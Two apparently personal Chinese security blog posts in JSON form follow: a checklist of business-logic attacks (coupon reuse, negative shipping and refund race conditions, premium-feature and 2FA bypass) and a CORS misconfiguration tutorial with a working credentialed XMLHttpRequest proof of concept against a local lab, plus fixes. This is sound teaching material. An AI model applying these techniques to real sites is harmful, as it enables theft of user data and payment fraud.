[{"content":"0x01 什么是逻辑漏洞 逻辑漏洞不同于其他的漏洞，通常不会对程序进行破坏，而是利用程序缺陷，来获得不属于自己的信息，例如平行越权和垂直越权；或是利用服务器校验不严格来提交错误的数据数量。\n0x02 常出现功能点 因为是程序的设计缺陷，所以通常逻辑漏洞会出现在用户与服务器进行数据交互的地方\n跟账户相关的例如：登录、注册、修改密码、找回密码等功能点\n跟订单相关的例如：提交订单、订单金额、订单数量等功能点\n跟验证码相关的例如：验证码返回在响应包内、验证码可复用等\n0x03 逻辑漏洞的危害 上面提到了逻辑漏洞的主要危害并不是因受到攻击而导致服务器停止运行，而是服务器对数据包的校验不严谨，导致非法用户获取了不属于自己的资源，常见的危害有：信息泄露、0元订单、未授权访问服务器配置文件等。\n0x04 附一些功能点的例子 评论功能 一些应用程序有一个选项，其中验证审查标记一些勾或提到。试着看看你是否可以在不购买产品的情况下，以经过验证的评论员的身份发布评论。 有些应用程序提供了一个选项，可以提供1到5的评分，尝试超过或低于这个评分——比如提供0或6或 -ve。 尝试看看同一个用户是否可以为一个产品发布多个评级。这是检查竞赛条件的一个有趣的端点。 试着查看文件上传字段是否允许任何文本，经常可以观察到开发人员错过了在这些端点上实现保护。 尝试像其他用户一样发布评论。 尝试在此功能上执行 CSRF，通常不受令牌保护 优惠券功能 应用相同的代码不止一次，以查看优惠券代码是否可重用。 尝试大量分配或 HTTP 参数污染，看看是否可以添加多个优惠券代码，而应用程序只接受来自客户端的一个代码。 尝试在这个字段上执行由于缺少输入消毒而导致的攻击，如 XSS、 SQLi 等 通过篡改服务器端的请求，尝试在折扣项目不涵盖的产品上添加折扣代码。 配送费篡改 尝试篡改送货费率至 -ve 值，看看最终金额是否可以减少。 尝试通过篡改参数来检查免费送货情况。 提现功能 用1种货币支付，比如美元，然后尝试用欧元退款。由于转化率的差异，可能获得更多的金额。 高级功能滥用 尝试使用低权限用户访问一些属于高级用户的特定接口 使用额外的功能取消订阅。如果你得到了退款，但是功能仍然可以使用，这是一个金钱影响问题。 一切程序使用 true/flase 请求/相应的值来验证用户是否有权限访问高级功能 Try using Burp\u0026rsquo;s Match \u0026amp; Replace to see if you can replace these values whenever you browse the app \u0026amp; access the premium features. 尝试使用 Burp’s Match \u0026amp; Replace 来查看是否可以在您浏览应用程序和访问高级功能时替换这些值。 始终检查 Cookie 或本地存储，看看是否有任何变量正在检查用户是否应该访问高级功能。 退款功能滥用 购买一个产品(通常是一些订阅) ，然后要求退款，看看这个功能是否仍然可用。 尝试发出多个订阅取消请求(竞赛条件) ，看看是否可以获得多次退款。 4.提现功能，涉及到的不同汇率提现 购物车/愿望单功能 加一个负数的产品和其他正数的产品来平衡数量。 Add a product in more than the available quantity. 添加超过可用数量的产品。 尝试看看当你添加一个产品到你的愿望清单，并将其移动到一个购物车，如果可能的话，将其移动到其他用户的购物车或从那里删除它。（平行越权其他用户） 线程注释功能 Unlimited Comments on a thread 线程上的无限注释 Suppose a user can comment only once, try race conditions here to see if multiple comments are possible. 假设一个用户只能注释一次，那么在这里尝试竞态条件，看看是否可能有多个注释。 假设有一个选项: 经过验证的用户(或某些有特权的用户)试图篡改各种参数，以查看是否可以执行此活动。 尝试模仿其他用户发表评论。 参数篡改 篡改支付或关键字段来操纵它们的值 Add multiple fields or unexpected fields by abusing HTTP Parameter Pollution \u0026amp; Mass Assignment 通过滥用 HTTP 参数污染和质量分配添加多个字段或意外字段 Response Manipulation to bypass certain restrictions such as 2FA Bypass 响应操作，以绕过某些限制，如2FA 旁路 ","date":"2022-08-11T03:34:55+08:00","image":"https://img-blog.csdnimg.cn/226e18cf216b4d3795cabaf1bc17ed3c.png","permalink":"https://kylin.moe/p/%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","title":"业务逻辑漏洞"},{"content":"在 xray 被动扫描的时候无意间看到了 baseline/cors/reflected，因为是未接触过的东西 简单总结一下，虽然到了最后换来了个 风险过低已忽略就是了\n0x01 什么是CORS 首先明白几个概念 Origin（源）、SOP（同源策略） 和 CROS（跨域资源访问） 分别是什么\nOrigin\n三个要素构成了Origin，分别是\n访问 Web 内容时的协议（http://） 域名（example.com） 端口（:80） 三者统称为源 Origin详解\nSOP\n同源策略（Same Origin Policy），同源策略是基于浏览器的安全策略，它限制了网站之间不能随意互相读取和访问对方的资源。只有请求源（本地）和目标源（服务器）相同时，才能对相应资源进行读取。 同源策略详解\nCORS\n跨域资源共享（Cross-Origin Resource Sharing）随着发展，业务不满足于内部的资源访问，于是便有了CORS（跨域资源共享）机制，开发者可以配置具体允许哪些源对服务器的资源进行访问，但是如果未进行配置，用户只要在请求标头 Origin 字段中加入允许访问的地址，那么就可以构建任意的可允许访问的源（Access-Control-Allow-Origin）\n通常 Access-Control-Allow-Origin 字段会在服务器的响应数据包内 请求标头Origin详解\n同源与不同源的例子\n假设服务器地址为 http://example.com\n几个同源的例子\n1 2 3 http://example.com http://example.com/1.php http://example.com/2.php 不同源的例子\n1 2 3 http://example.com https://example.com http://example.com:8080 漏洞是如何产生的\n上文提到了 请求标头 Origin 是可以构建的，假设服务器没有对字段做严格的限制，那么我们可以构造任意字段，让服务器的资源可提供给任意的第三方服务器。\n那么服务器同时满足下面三点要求，则可能构成CORS漏洞\n1 2 3 开启了 CORS（跨域资源共享） 未对Origin（请求标头）的内容做限制 未限制 Access-Control-Allow-Origin（允许访问的源） 字段 0x02 DoraBox靶场复现 这里使用 DoraBox靶场: https://github.com/0verSp4ce/DoraBox\n本地搭建环境，访问 URL http://localhost/DoraBox/csrf/userinfo.php\n拦截数据包分析响应包内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 05 Aug 2022 20:35:19 GMT Content-Type: text/html; charset=UTF-8 Connection: close X-Powered-By: PHP/7.4.6 Access-Control-Allow-Origin: * Access-Control-Allow-Headers: X-Requested-With Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS Content-Length: 151 {\u0026#34;username\u0026#34;:\u0026#34;Vulkey_Chen\u0026#34;,\u0026#34;mobilephone\u0026#34;:\u0026#34;13188888888\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;admin@gh0st.cn\u0026#34;,\u0026#34;address\u0026#34;:\u0026#34;\\u4e2d\\u534e\\u4eba\\u6c11\\u5171\\u548c\\u56fd\u0026#34;,\u0026#34;sex\u0026#34;:\u0026#34;Cool Man\u0026#34;} Access-Control-Allow-Origin:* 允许所有域都具有访问资源的权限。\nAccess-Control-Allow-Credentials: true 允许将请求的响应内容暴露给前端的JavaScript代码\nAccess-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS 允许跨域访问资源的请求方式\n服务端响应包内声明了，1. 任何域都可以访问资源 2. 允许将相应内容通过 JavasScript 代码获取 3. 允许多种方式，如PUT,POST,GET 方式请求服务器资源，那我们我们可以构建 POC 请求服务器资源\n这里的 POC 在靶场 DoraBox/PoC/csrf/CORS/index.html 目录内有现成的，直接套用\n在本地构建 report.html\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;cors exp\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;script type=\u0026#34;text/javascript\u0026#34;\u0026gt; function cors() { var xhttp = new XMLHttpRequest(); xhttp.onreadystatechange = function() { if (this.status == 200) { alert(this.responseText); document.getElementById(\u0026#34;demo\u0026#34;).innerHTML = this.responseText; } }; xhttp.open(\u0026#34;GET\u0026#34;, \u0026#34;http://localhost/DoraBox/csrf/userinfo.php\u0026#34;); xhttp.withCredentials = true; xhttp.send(); } cors(); \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; report.html 通过 javascript 代码请求服务器资源，并且服务器返回了响应的资源，在存在 CORS 漏洞的前提下，可以通过 CORS 来访问服务器未授权的接口、或是一些用户的敏感信息。\n使用浏览器打开页面 report.html\n请求包\n1 2 3 4 5 6 7 8 9 10 11 GET /DoraBox/csrf/userinfo.php HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Origin: null Connection: close Sec-Fetch-Dest: empty Sec-Fetch-Mode: cors Sec-Fetch-Site: cross-site 响应包\n1 2 3 4 5 6 7 8 9 10 11 12 13 HTTP/1.1 200 OK Server: nginx/1.18.0 Date: Fri, 05 Aug 2022 20:43:19 GMT Content-Type: text/html; charset=UTF-8 Connection: close X-Powered-By: PHP/7.4.6 Access-Control-Allow-Origin: null Access-Control-Allow-Headers: X-Requested-With Access-Control-Allow-Credentials: true Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS Content-Length: 151 {\u0026#34;username\u0026#34;:\u0026#34;Vulkey_Chen\u0026#34;,\u0026#34;mobilephone\u0026#34;:\u0026#34;13188888888\u0026#34;,\u0026#34;email\u0026#34;:\u0026#34;admin@gh0st.cn\u0026#34;,\u0026#34;address\u0026#34;:\u0026#34;\\u4e2d\\u534e\\u4eba\\u6c11\\u5171\\u548c\\u56fd\u0026#34;,\u0026#34;sex\u0026#34;:\u0026#34;Cool Man\u0026#34;} 梳理一下整个流程，此时存在 网站A 和网站B，以及用户A。网站A是业务站点，网站B是我们搭建的恶意请求资源站点。\n用户A在网站A登录了自己的账号，网站A返回了相应的用户信息 用户A访问了网站B，网站B通过用户A向网站A发起请求，此时网站A返回相应内容，因为没有对跨域资源访问做限制，网站B也能获取到网站A的响应内容 因为未对跨域请求做限制而导致第三方站点可以请求服务器资源，并不是绝对存在安全隐患的。假如说一个设计用户隐私的页面，页面会返回敏感信息的时候，这时候假设用户访问了恶意站点，恶意站点又针对敏感信息做了资源请求，可能就会导致用户的信息泄露。\n针对CORS漏洞的挖掘有一些小 tips，也简单的提一下\n利用burpsuite，设置访问头带Origin请求，过滤响应包的内容\nBurpSuite 配置 Proxy - Options - Match and Replace 勾选 Request header Origin: foo.example.org\n历史数据包中过滤规则包含 Access-Control-Allow-Origin: foo.example.org 也就是筛选允许跨域资源请求的站点，针对这些站点返回的信息，单个的进行手工检测。\n0x03 修复方案 严格限制 Origin 字段的内容 配置 Access-Control-Allow-Origin 可访问的源 避免 Access-Control-Allow-Origin: null 信任形式建议配置为 *.example.com 或 .example.com 减少 Access-Control-Allow-Methods 允许的请求方式 参考文献\nCORS跨域漏洞学习 - Lushun CORS跨域漏洞的学习 - FreeBuf网络安全行业门户 CORS - 术语表 | MDN (mozilla.org) 文章是自己整理出来的，因为是一个新的知识点，设计到的东西太多了，不可能没有任何瑕疵和纰漏，希望能帮到你。如果有任何疑问，欢迎给我留言。\n","date":"2022-08-10T17:16:45+08:00","image":"https://img-blog.csdnimg.cn/img_convert/a09ad76b3dfb19364fa79f034b0f2d85.png","permalink":"https://kylin.moe/p/cors%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E/","title":"CORS跨域资源共享漏洞"}]